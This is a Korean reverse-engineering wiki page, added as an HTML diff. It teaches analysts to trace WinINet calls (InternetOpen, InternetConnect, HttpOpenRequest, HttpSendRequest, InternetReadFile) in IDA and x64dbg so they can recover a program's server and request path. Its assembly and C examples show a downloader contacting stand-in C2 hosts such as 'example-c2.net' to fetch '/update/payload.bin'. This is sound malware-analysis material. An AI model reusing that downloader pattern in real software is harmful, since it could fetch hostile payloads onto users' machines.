@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>WinAPI 네트워킹 함수 사전: InternetOpen 계열(WinINet 기초) · Reversing 오프라인 위키</title>
+<link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+<header class="site-header">
+  <div class="header-top">
+    <a class="site-title" href="../index.html">Reversing 오프라인 위키</a>
+    <form class="header-search" action="../index.html" method="get">
+      <input type="search" name="q" placeholder="검색: call, positive sp value, 16777619...">
+      <button type="submit">검색</button>
+    </form>
+    <button id="theme-toggle" type="button">다크 모드</button>
+  </div>
+  <nav class="site-nav">
+    <ul><li><a href="../index.html">처음 시작</a></li><li><a href="../index.html?cat=triage">30초 트리아지</a></li><li><a href="../index.html?q=%ED%99%95%EC%9E%A5%EC%9E%90">파일 종류별 접근</a></li><li><a href="../index.html?stuck=1">증상으로 찾기</a></li><li><a href="../index.html?cat=assembly">Assembly Dictionary</a></li><li><a href="../index.html?q=PE">Windows / PE</a></li><li><a href="../index.html?cat=linux-elf">Linux / ELF</a></li><li><a href="../index.html?cat=static-analysis">정적 분석</a></li><li><a href="../index.html?cat=dynamic-analysis">동적 분석</a></li><li><a href="../index.html?cat=packing">패킹 / 안티디버깅</a></li><li><a href="../index.html?cat=algorithms">알고리즘 패턴</a></li><li><a href="../index.html?cat=tools">툴 사용법</a></li><li><a href="../index.html?q=%EB%8B%A8%EC%B6%95%ED%82%A4">단축키</a></li><li><a href="../index.html?cat=automation">자동화 / Solver</a></li><li><a href="../index.html?cat=writeup">Write-up (드림핵)</a></li><li><a href="../index.html?cat=c-analysis">C 코드 분석</a></li><li><a href="../index.html?cat=other-targets">타 아키텍처/언어</a></li></ul>
+  </nav>
+</header>
+<main>
+<div class="breadcrumb"><a href="../index.html">홈</a> / windows-pe</div>
+<article class="article-body">
+<h1>WinAPI 네트워킹 함수 사전: InternetOpen 계열(WinINet 기초)</h1>
+<div class="article-meta"><span class="tag">windows-pe</span><span class="tag">기초</span><span class="tag">windows</span><span class="tag">PE</span><span class="tag">IDA</span><span class="tag">x64dbg</span></div>
+<h2>한 줄 요약</h2>
+<p><code>InternetOpen</code>으로 시작해 <code>InternetConnect</code> → <code>HttpOpenRequest</code> → <code>HttpSendRequest</code> → <code>InternetReadFile</code>로 이어지는 WinINet API 체인은 저수준 소켓(REV-0512/0513) 대신 HTTP(S) 프로토콜을 사용해 파일을 다운로드하거나 서버와 통신하는 코드에서 나타나며, <code>wininet.dll</code>이라는 Import 자체가 "이 프로그램은 HTTP 기반으로 외부와 통신한다"는 강한 신호이므로 각 단계 인자에서 URL/서버 주소를 뽑아내는 것이 분석의 핵심이다.</p>
+<h2>언제 검색해야 하나</h2>
+<ul><li>Import 목록에서 <code>wininet.dll</code>을 발견하고 이 프로그램이 무엇을 다운로드하거나 어디로 데이터를 보내는지 확인해야 할 때</li><li><code>InternetConnect</code>/<code>HttpOpenRequest</code>의 인자에서 서버 이름과 요청 경로(URL)를 추출해야 할 때</li><li>다운로더형 악성코드나 CTF 문제에서 "이 프로그램이 접속하는 주소가 무엇인가"를 알아내야 할 때</li><li>저수준 소켓 API(<code>socket</code>/<code>connect</code>)가 안 보이는데도 네트워크 관련 문자열(<code>http://</code>, <code>User-Agent</code> 등)이 보여서 어떤 API 계열을 쓰는지 확인해야 할 때</li></ul>
+<h2>핵심 개념</h2>
+<h3>호출 순서와 각 함수의 역할</h3>
+<pre><code class="language-c">HINTERNET InternetOpenA(
+    LPCSTR lpszAgent,       // 1. User-Agent 문자열(임의로 지정 가능)
+    DWORD  dwAccessType,    // 2. INTERNET_OPEN_TYPE_DIRECT(1) 또는 PRECONFIG(0, IE 설정 사용)
+    LPCSTR lpszProxyName,   // 3. 프록시 서버(대개 NULL)
+    LPCSTR lpszProxyBypass, // 4. 프록시 예외(대개 NULL)
+    DWORD  dwFlags          // 5. 대개 0
+);
+
+HINTERNET InternetConnectA(
+    HINTERNET hInternet,       // 1. InternetOpen이 반환한 세션 핸들
+    LPCSTR    lpszServerName,  // 2. 접속할 서버 도메인/IP — 여기서 C2/다운로드 서버가 바로 드러남
+    INTERNET_PORT nServerPort, // 3. 포트(INTERNET_DEFAULT_HTTP_PORT=80, HTTPS_PORT=443)
+    LPCSTR    lpszUsername,    // 4. 대개 NULL
+    LPCSTR    lpszPassword,    // 5. 대개 NULL
+    DWORD     dwService,       // 6. INTERNET_SERVICE_HTTP(3)
+    DWORD     dwFlags,         // 7. INTERNET_FLAG_SECURE(0x800000, HTTPS)
+    DWORD_PTR dwContext        // 8. 대개 0
+);
+
+HINTERNET HttpOpenRequestA(
+    HINTERNET hConnect,      // 1. InternetConnect가 반환한 연결 핸들
+    LPCSTR    lpszVerb,      // 2. "GET"/"POST" 등
+    LPCSTR    lpszObjectName,// 3. 요청 경로 — "/payload.bin" 같은 URL의 뒷부분
+    LPCSTR    lpszVersion,   // 4. 대개 NULL(HTTP/1.1)
+    LPCSTR    lpszReferrer,  // 5. 대개 NULL
+    LPCSTR    *lplpszAcceptTypes,
+    DWORD     dwFlags,
+    DWORD_PTR dwContext
+);
+
+BOOL HttpSendRequestA(
+    HINTERNET hRequest,      // 1. HttpOpenRequest가 반환한 요청 핸들
+    LPCSTR    lpszHeaders,   // 2. 추가 헤더(대개 NULL)
+    DWORD     dwHeadersLength,
+    LPVOID    lpOptional,    // POST 본문 데이터
+    DWORD     dwOptionalLength
+);
+
+BOOL InternetReadFile(
+    HINTERNET hFile,                     // 1. 요청 핸들
+    LPVOID    lpBuffer,                  // 2. 응답 본문이 채워질 버퍼
+    DWORD     dwNumberOfBytesToRead,     // 3. 읽을 최대 바이트 수
+    LPDWORD   lpdwNumberOfBytesRead      // 4. 실제로 읽은 바이트 수
+);</code></pre>
+<p>이 다섯 함수가 순서대로(핸들이 이전 함수의 반환값을 이어받으며) 등장하는 패턴이 표준적인 "HTTP GET으로 뭔가를 받아오는" 코드다.</p>
+<h3>서버 주소를 재구성하는 법</h3>
+<p>전체 URL은 코드 어디에도 문자열 하나로 존재하지 않는 경우가 많다 — <code>InternetConnect</code>의 <code>lpszServerName</code>(도메인)과 <code>HttpOpenRequest</code>의 <code>lpszObjectName</code>(경로)이 서로 다른 함수 호출에 나뉘어 있으므로, 두 값을 각각 확인해 <code>https://{lpszServerName}:{nServerPort}{lpszObjectName}</code> 형태로 직접 조합해야 한다.</p>
+<h3>WinHTTP와의 차이</h3>
+<p>비슷한 역할을 하는 <code>WinHttpOpen</code>(winhttp.dll) 계열도 있다. WinINet은 사용자 IE 프록시 설정에 의존하는 데스크톱 애플리케이션용이고, WinHTTP는 서비스/백그라운드 프로세스에서 더 흔히 쓰인다는 차이가 있지만, 리버싱 관점에서는 함수 이름과 인자 구조가 매우 유사하므로 이 문서의 분석 방식을 거의 그대로 적용할 수 있다.</p>
+<h2>화면/코드에서 보이는 징후</h2>
+<pre><code class="language-asm">push 0
+push 0
+push 0
+push 1                       ; INTERNET_OPEN_TYPE_DIRECT
+push offset agentStr         ; "Mozilla/5.0 ..."
+call InternetOpenA
+...
+push 800000h                 ; INTERNET_FLAG_SECURE
+push 3                       ; INTERNET_SERVICE_HTTP
+push 0
+push 0
+push 1BBh                    ; 443
+push offset serverName       ; "malicious-c2.example"
+push [hInternet]
+call InternetConnectA
+...
+push offset objName          ; "/update/payload.bin"
+push offset verbGet          ; "GET"
+push [hConnect]
+call HttpOpenRequestA</code></pre>
+<ul><li><code>InternetOpenA</code>의 첫 인자로 흔한 브라우저 User-Agent 문자열이 그대로 하드코딩되어 있는 경우가 많다(정상 트래픽처럼 위장하려는 목적).</li><li><code>InternetConnectA</code>의 두 번째 인자(서버 도메인)가 Strings 창에 그대로 노출되는 경우가 흔하다.</li></ul>
+<h2>가장 먼저 할 것</h2>
+<p>Strings 창(<code>Shift+F12</code>)에서 도메인처럼 보이는 문자열이나 <code>"GET"</code>/<code>"POST"</code>/<code>"http"</code> 같은 키워드를 먼저 훑고, <code>InternetConnectA</code>/<code>HttpOpenRequestA</code>의 xref를 따라가 실제로 어떤 인자가 들어가는지 대조한다.</p>
+<h2>단계별 절차</h2>
+<p><strong>1) Import에서 체인 확인</strong> <code>wininet.dll</code>에서 <code>InternetOpenA/W</code>, <code>InternetConnectA/W</code>, <code>HttpOpenRequestA/W</code>, <code>HttpSendRequestA/W</code>, <code>InternetReadFile</code>이 모두 있는지 확인한다.</p>
+<p><strong>2) 각 핸들의 인자 추적(IDA)</strong> <code>X</code>(xref)로 각 함수 호출 지점을 찾아 <code>lpszServerName</code>, <code>nServerPort</code>, <code>lpszObjectName</code>을 순서대로 기록한다.</p>
+<p><strong>3) x64dbg로 동적 확인</strong></p>
+<pre><code class="language-text">bp InternetConnectA
+run
+; x64: RDX = lpszServerName — Follow in Dump로 도메인 문자열 확인
+bp HttpOpenRequestA
+run
+; x64: R8 = lpszObjectName — Follow in Dump로 경로 확인</code></pre>
+<p><strong>4) 응답 데이터 확인</strong> <code>InternetReadFile</code> 호출 이후(<code>Ctrl+F9</code>) <code>lpBuffer</code>를 확인하면 실제로 다운로드된 데이터(추가 페이로드, 설정 등)를 볼 수 있다.</p>
+<h2>명령어/단축키</h2>
+<ul><li>x64dbg: <code>bp InternetOpenA</code>, <code>bp InternetConnectA</code>, <code>bp HttpOpenRequestA</code>, <code>bp HttpSendRequestA</code>, <code>bp InternetReadFile</code></li><li>x64dbg: 문자열 인자 주소 우클릭 → <code>Follow in Dump</code>, Dump 창 우클릭 → <code>Text</code> 표시 전환</li><li>IDA: <code>Shift+F12</code>(Strings), <code>X</code>(xref)</li></ul>
+<h2>출력 해석</h2>
+<ul><li>각 <code>HINTERNET</code> 반환값이 <code>NULL</code>이면 그 단계에서 실패한 것이며, <code>GetLastError()</code>로 원인(DNS 실패, 프록시 문제 등)을 확인한다.</li><li><code>HttpSendRequestA</code>가 <code>TRUE</code>를 반환했다면 요청은 전송된 것이고, 실제 응답 코드(200, 404 등)는 별도로 <code>HttpQueryInfo</code>를 호출해야 확인할 수 있다(이 문서에서 다루지 않은 별도 API).</li><li><code>InternetReadFile</code>이 <code>lpdwNumberOfBytesRead</code>에 <code>0</code>을 채우면 더 이상 받을 데이터가 없다는(다운로드 완료) 뜻이다.</li></ul>
+<h2>흔한 실수</h2>
+<ul><li>전체 URL이 문자열 하나로 어딘가에 존재할 것이라 가정하고 Strings 창만 뒤지는 것 — 서버명과 경로가 서로 다른 함수 인자로 나뉘어 있어 두 곳을 모두 확인해야 한다.</li><li><code>A</code>(ANSI) 버전과 <code>W</code>(유니코드) 버전 함수 이름이 다르다는 것을 놓치고 Import 목록에서 한쪽만 검색하는 것 — 두 버전 모두 확인해야 한다.</li><li><code>wininet.dll</code>이 있다고 해서 반드시 파일 다운로드 목적이라 단정하는 것 — 단순 버전 체크, 라이선스 서버 통신 등 정상적인 목적도 흔하다.</li></ul>
+<h2>막혔을 때 다음 체크</h2>
+<ul><li>저수준 소켓 기반 통신과 비교하고 싶다면 → REV-0512 WinAPI 네트워킹 함수 사전: WSAStartup socket connect</li><li>다운로드한 데이터를 디스크에 저장하는 흐름까지 보고 싶다면 → REV-0139 CreateFile ReadFile WriteFile 입력 데이터 추적</li><li>받은 데이터가 암호화되어 있다면 → REV-0140 Crypt API BCrypt API 흔적 찾기</li></ul>
+<h2>미니 예제</h2>
+<pre><code class="language-c">HINTERNET hInet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+HINTERNET hConn = InternetConnectA(hInet, "example-c2.net", 443, NULL, NULL, INTERNET_SERVICE_HTTP, INTERNET_FLAG_SECURE, 0);
+HINTERNET hReq  = HttpOpenRequestA(hConn, "GET", "/update/payload.bin", NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
+HttpSendRequestA(hReq, NULL, 0, NULL, 0);
+char buf[4096]; DWORD read;
+InternetReadFile(hReq, buf, sizeof(buf), &amp;read);</code></pre>
+<p>위 코드에서 실제 접속 대상은 <code>https://example-c2.net:443/update/payload.bin</code>이며, <code>InternetConnectA</code>와 <code>HttpOpenRequestA</code> 각각의 두/세 번째 인자를 조합해야 이 전체 URL이 재구성된다.</p>
+<h2>관련 글</h2>
+<ul><li><a href="rev-0512-wsastartup-socket-connect.html">REV-0512 — WinAPI 네트워킹 함수 사전: WSAStartup socket connect</a></li><li><a href="rev-0139-createfile-readfile-writefile.html">REV-0139 — CreateFile ReadFile WriteFile 입력 데이터 추적</a></li><li><a href="rev-0140-crypt-bcrypt-api.html">REV-0140 — Crypt API BCrypt API 흔적 찾기</a></li></ul>
+<h2>출처/검증</h2>
+<ul><li><code>InternetOpen</code>/<code>InternetConnect</code>/<code>HttpOpenRequest</code>/<code>HttpSendRequest</code>/<code>InternetReadFile</code>의 시그니처와 플래그 상수는 Microsoft 공식 문서(learn.microsoft.com, "WinINet functions") 기준이다(2026-09-08 확인).</li><li>WinINet과 WinHTTP의 용도 차이는 Microsoft 공식 문서("Choosing an HTTP API")의 일반적인 안내 기준이며, 다운로더형 악성코드의 URL 재구성 기법은 통상적인 분석 관례 레퍼런스 기준이다.</li></ul>
+</article>
+</main>
+<footer class="site-footer">
+  <p>Reversing-Offline-Search-Web &mdash; 완전 오프라인 한국어 리버싱 지식베이스. 인터넷 연결 없이 <code>dist/index.html</code>을 더블클릭해서 사용하세요.</p>
+</footer>
+<script src="../assets/search-index.js"></script>
+<script src="../assets/js/theme.js"></script>
+<script src="../assets/js/search.js"></script>
+</body>
+</html>
